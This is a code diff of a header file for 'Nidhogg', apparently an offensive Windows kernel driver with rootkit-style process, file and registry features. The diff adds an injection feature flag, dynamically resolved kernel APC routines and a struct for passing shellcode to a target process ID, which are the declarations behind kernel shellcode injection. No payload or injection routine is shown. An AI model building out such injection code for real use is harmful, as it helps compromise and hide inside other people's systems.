@@ -2,15 +2,9 @@
 #include "pch.h"
 
 // #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
-#define DRIVER_PREFIX "Nidhogg: "
-#define DRIVER_NAME L"\\Driver\\Nidhogg"
-#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
-#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
 #define DRIVER_TAG 'hdiN'
-#define OB_CALLBACKS_ALTITUDE L"31105.6171"
-#define REG_CALLBACK_ALTITUDE L"31122.6172"
+#define DRIVER_PREFIX "Nidhogg: "
 
-#define REGISTERED_OB_CALLBACKS 2
 #define SUPPORTED_HOOKED_NTFS_CALLBACKS 1
 #define MAX_PATCHED_MODULES 256
 #define MAX_PIDS 256
@@ -20,51 +14,6 @@
 #define MAX_REG_ITEMS 256
 #define REG_VALUE_LEN 260
 #define REG_KEY_LEN 255
-
-// Prototypes.
-NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
-NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
-DRIVER_UNLOAD NidhoggUnload;
-DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
-void ClearAll();
-
-typedef NTSTATUS(NTAPI* tZwProtectVirtualMemory)(
-	HANDLE ProcessHandle, 
-	PVOID* BaseAddress, 
-	SIZE_T* NumberOfBytesToProtect, 
-	ULONG NewAccessProtection, 
-	PULONG OldAccessProtection);
-
-typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(
-	PEPROCESS SourceProcess, 
-	PVOID SourceAddress, 
-	PEPROCESS TargetProcess, 
-	PVOID TargetAddress, 
-	SIZE_T BufferSize, 
-	KPROCESSOR_MODE PreviousMode, 
-	PSIZE_T ReturnSize);
-
-typedef PPEB(NTAPI* tPsGetProcessPeb)(
-	PEPROCESS Process);
-
-typedef NTSTATUS (NTAPI* tObReferenceObjectByName)(
-	PUNICODE_STRING ObjectName,
-	ULONG Attributes,
-	PACCESS_STATE AccessState,
-	ACCESS_MASK DesiredAccess,
-	POBJECT_TYPE ObjectType,
-	KPROCESSOR_MODE AccessMode,
-	PVOID ParseContext,
-	PVOID* Object);
-
-typedef NTSTATUS(NTAPI* tNtfsIrpFunction)(
-	PDEVICE_OBJECT DeviceObject,
-	PIRP Irp);
-
-typedef NTSTATUS(NTAPI* tIoCreateDriver)(
-	PUNICODE_STRING DriverName,
-	PDRIVER_INITIALIZE InitializationFunction
-	);
 
 // Globals.
 PVOID RegistrationHandle = NULL;
@@ -78,15 +27,20 @@ struct EnabledFeatures {
 	bool ProcessProtection		  = true;
 	bool ThreadProtection		  = true;
 	bool FileProtection			  = true;
+	bool Injection				  = true;
 };
 EnabledFeatures Features;
 
 // --- ModuleUtils structs ----------------------------------------------------
 struct DynamicImportedModulesGlobal {
-	tObReferenceObjectByName ObReferenceObjectByName;
-	tZwProtectVirtualMemory  ZwProtectVirtualMemory;
-	tMmCopyVirtualMemory	 MmCopyVirtualMemory;
-	tPsGetProcessPeb		 PsGetProcessPeb;
+	tObReferenceObjectByName  ObReferenceObjectByName;
+	tZwProtectVirtualMemory   ZwProtectVirtualMemory;
+	tMmCopyVirtualMemory	  MmCopyVirtualMemory;
+	tPsGetProcessPeb		  PsGetProcessPeb;
+	tKeInitializeApc		  KeInitializeApc;
+	tKeInsertQueueApc		  KeInsertQueueApc;
+	tKeTestAlertThread		  KeTestAlertThread;
+	tZwQuerySystemInformation ZwQuerySystemInformation;
 
 	void Init() {
 		UNICODE_STRING routineName;
@@ -98,9 +52,26 @@ struct DynamicImportedModulesGlobal {
 		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
 		RtlInitUnicodeString(&routineName, L"ObReferenceObjectByName");
 		ObReferenceObjectByName = (tObReferenceObjectByName)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"KeInitializeApc");
+		KeInitializeApc = (tKeInitializeApc)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"KeInsertQueueApc");
+		KeInsertQueueApc = (tKeInsertQueueApc)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"KeTestAlertThread");
+		KeTestAlertThread = (tKeTestAlertThread)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"ZwQuerySystemInformation");
+		ZwQuerySystemInformation = (tZwQuerySystemInformation)MmGetSystemRoutineAddress(&routineName);
 	}
 };
 DynamicImportedModulesGlobal dimGlobals;
+
+struct ShellcodeInformation {
+	ULONG Pid;
+	ULONG ShellcodeSize;
+	PVOID Shellcode;
+	PVOID Parameter1;
+	PVOID Parameter2;
+	PVOID Parameter3;
+};
 
 struct PatchedModule {
 	ULONG Pid;
